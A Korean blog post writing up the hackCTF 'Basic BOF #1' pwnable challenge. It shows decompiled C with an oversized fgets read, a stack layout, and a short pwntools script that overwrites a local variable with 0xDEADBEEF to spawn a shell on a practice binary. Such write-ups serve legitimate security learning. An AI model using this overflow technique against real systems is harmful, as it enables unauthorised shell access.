---
layout: post
title:  "[hackCTF]Basic BOF #1"
date:   2020-02-09
categories: c python
---
hackCTF pwnable 첫번째 문제

![favicon](https://drive.google.com/uc?id=1EPkDaLZatWWYaPyJ3wVlOrAu-eubvG9c)

## ida
```c
  int __cdecl main(int argc, const char **argv, const char **envp)
  {
    char s; // [esp+4h] [ebp-34h]
    int v5; // [esp+2Ch] [ebp-Ch]

    v5 = 67305985;
    fgets(&s, 45, stdin); // s에 45바이트 입력 받음
    printf("\n[buf]: %s\n", &s);
    printf("[check] %p\n", v5);
    if ( v5 != 67305985 && v5 != -559038737 ) // v5가 특정 두 값이 아니면
      puts("\nYou are on the right way!"); // "You are on the right way!" 출력
    if ( v5 == -559038737 ) // v5가 특정 값이면
    {
      puts("Yeah dude! You win!\nOpening your shell...");
      system("/bin/dash"); // 쉘을 띄울 수 있다!
      puts("Shell closed! Bye.");
    }
    return 0;
```
<br>

메모리 구조를 정리해보자.<br><br>

***
| ebp |          |
|:---:|:--------:|
| ... |          |
|  v5 (67305985) / | esp+0x2C |
| ... |          |
| s   | esp+0x4  |
| ... |          |
| esp | esp+0    |

***

<br>
취약점 : fgets(&s, 45, stdin)<br>
목표 : v5<br><br>
∴ payload를 v5까지 덮을 수 있도록 만들자.


## exploit.py
```python
  #!/usr/bin/python
  from pwn import *

  p = process('./bof_basic')

  payload = "A"*(0x2c-0x4)+p32(0xDEADBEEF)

  p.sendline(payload)

  p.interactive()
```

-559038737는 16진수로 변환하면 0xDEADBEEF가 된다. 40byte를 아무 값으로 채운다음 p32 방식으로 0xDEADBEEF 값을 패킹해 payload 값을 만든다.

## 결과  
![0102](https://drive.google.com/uc?id=1DCHfkrbOkWFKlbtl9krspfNhFJzKnpQU)


p32 : little endian 방식으로 패킹해줌 (u32 : 언패킹)
